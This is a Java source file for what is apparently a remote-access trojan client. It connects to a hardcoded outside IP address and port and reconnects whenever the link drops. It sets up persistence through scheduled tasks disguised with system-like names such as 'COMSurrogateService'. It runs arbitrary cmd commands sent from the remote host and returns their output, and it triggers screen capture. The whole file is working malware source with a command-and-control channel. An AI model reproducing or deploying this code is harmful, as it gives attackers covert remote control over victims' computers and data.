import java.net.*;
import java.io.*;
public class client {
    Socket sock;    
    PrintStream ps;
    BufferedReader din;    
    InputStream is;
    String loc;
    public static void main(String[] args) throws Exception { 
        new client();
    }
    public client() {
        try {
            Thread.sleep(5000);
        } catch (Exception e) {
            e.printStackTrace();
        }
        while(true) {
            try {
                loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(); 
                loc=loc.substring(1);
                //Runtime.getRuntime().exec("cmd /c copy " + loc + " o.jar");
                sock = new Socket("92.53.66.44", 32323);
                ps = new PrintStream(sock.getOutputStream());
                din = new BufferedReader(new InputStreamReader(sock.getInputStream()));
                is = sock.getInputStream();
                boolean sh = false;        
                //System.out.println(loc);
                while(true) {
                    String line = din.readLine();
                    if (line.equals("ps99")) {
                        Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr "+ loc + " /sc ONSTART ");
                        Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc ONLOGON "); 
                        Process proc3 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn ManagerServiceInv /tr " + loc + " /sc ONIDLE /i 20");
                        Process proc4 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn COMSurrogateService /tr " + loc + " /sc MINUTE /mo 10");
                        //Process proc4 = Runtime.getRuntime().exec("cmd /c echo %username%");
                        //BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc4.getInputStream()));  
                        //String username = stdInput.readLine();
                        //
                        //Process proc5 = Runtime.getRuntime().exec("cmd /c cp " + loc +  "C:\Users\ " + username + "\AppData\Roaming\Microsoft\Windows\"\Start Menu\"\Programs\Startup");
                    }
                    if (line.equals("ps-99")) {
                        Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn WindowsDisplay /f");
                        Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn GraphicsUpdate /f");
                        Process proc3 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn ManagerServiceInv /f");
                        Process proc4 = Runtime.getRuntime().exec("cmd /c schtasks.exe /delete /tn COMSurrogateService /f");
                    }
                    if (line.equals("sh-99")) {
                        sh=false;
                    }
                    if (sh==true) {
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process proc = rt.exec("cmd /c " + line);
                            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                            String s = "";
                            while ((s = stdInput.readLine()) != null) {
                                ps.println(s);
                            }
                            ps.println("{}{}{}");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }  
                    }
                    if (line.equals("sh99")) {
                        sh=true;
                    }      
                    if (line.equals("ap99")) {
                        int seconds = Integer.parseInt(din.readLine());
                        ps.flush();
                        ps.println("{}{}{}");
                        initscreen.init(ps,seconds);
                    }
                }
            } catch (Exception e) {
            }
            try {
                Thread.sleep(10000);
            } catch (Exception e) {
            }
        }
    }
}